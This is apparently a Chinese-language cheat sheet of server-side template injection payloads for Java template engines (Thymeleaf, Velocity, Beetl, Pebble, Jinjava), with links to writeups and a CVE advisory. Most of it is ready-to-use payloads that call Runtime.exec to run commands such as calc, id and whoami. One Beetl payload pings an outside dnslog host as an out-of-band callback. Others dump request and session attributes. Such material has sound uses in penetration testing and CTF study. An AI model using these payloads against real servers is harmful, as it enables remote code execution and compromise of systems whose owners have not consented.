# Java模板注入



大概看了一下，有这么几种模板

 - FreeMarker模板

   ```java
   <ul>
   <#list .data_model?keys as key>
   <li>${key}</li>
   </#list>
   </ul>
   ${.data_model.keySet()}
   ```

 - Thymeleaf模板

   ```java
   SpringEL: ${T(java.lang.Runtime).getRuntime().exec('calc')}
   OGNL: ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
   ```

 - jsp模板(el表达式)

 - Velocity模板

   ```java
   <ul>
   #foreach( $key in $context.keys )
   <li>$key = $context.get($key)</li>
   #end
   </ul>
   
   <ul>
   #foreach( $a in $request.getAttributeNames() )
   <li>$a</li>
   #end
   </ul>
   
   <ul>
   #foreach( $a in $request.getSession(true).getAttributeNames() )
   <li>$a</li>
   #end
   </ul>
   
   <ul>
   #foreach( $a in $request.getServletContext().getAttributeNames() )
   <li>$a</li>
   #end
   </ul>
   ```

 - beetl模板

   `byteCTF2021考过`

   ```
   http://ibeetl.com/beetlonline/
   https://landgrey.me/blog/17/
   JfinalCMS: https://xz.aliyun.com/t/8695
   ```

   ```${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"ping 029bzv.dnslog.cn")} ```

   bypass: https://ma4ter.cn/2682.html

   ```
   https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/
   ```

 - Pebble模板

   https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/

   https://gingsguard.github.io/server-side-template-injection-on-the-example-of-pebble/

   Java 9+

   ```
   {% set cmd = 'id' %}
   {% set bytes = (1).TYPE
        .forName('java.lang.Runtime')
        .methods[6]
        .invoke(null,null)
        .exec(cmd)
        .inputStream
        .readAllBytes() %}
   {{ (1).TYPE
        .forName('java.lang.String')
        .constructors[0]
        .newInstance(([bytes]).toArray()) }}
   ```

   JDK8

   ```
   {% set out = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec("whoami").inputStream %}
   [{% for i in range(1,99) %}{% set byte = out.read() %}{{ byte }},{% endfor %}]
   ```

 - Jinjava

   `CVE-2020-12668`

   poc

   ```
   {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("")}}
   ```

   ```
   {{'a'.getClass().forName('java.lang.Runtime').methods[6].invoke(null).exec("calc")}}
   ```

   ```
   https://securitylab.github.com/advisories/GHSL-2020-072-hubspot_jinjava/
   ```

 - 在实际环境种获取classLoader的方法

   ```javascript
   ● java.lang.Class.getClassLoader()
   ● java.lang.Thread.getCurrentClassLoader()
   ● java.lang.ProtectionDomain.getClassLoader()
   ● javax.servlet.ServletContext.getClassLoader()
   ● org.osgi.framework.wiring.BundleWiring.getClassLoader()
   ● org.springframework.context.ApplicationContext.getClassLoader()
   ```

   

参考资料

> 1.(包括了大部分的模板注入)https://cloud.tencent.com/developer/article/1771497
>
> 